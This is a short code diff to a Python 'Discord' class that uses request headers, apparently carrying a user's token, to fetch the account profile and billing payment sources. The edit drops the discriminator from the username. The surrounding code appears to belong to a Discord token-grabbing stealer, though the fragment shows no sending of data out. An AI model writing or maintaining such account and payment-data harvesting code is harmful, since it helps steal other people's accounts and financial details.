@@ -435,7 +435,7 @@ class Discord:
             }
             user = requests.get(self.baseurl, headers=headers).json()
             payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
-            username = user['username'] + '#' + user['discriminator']
+            username = user['username']
             discord_id = user['id']
             avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" \
                 if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 \
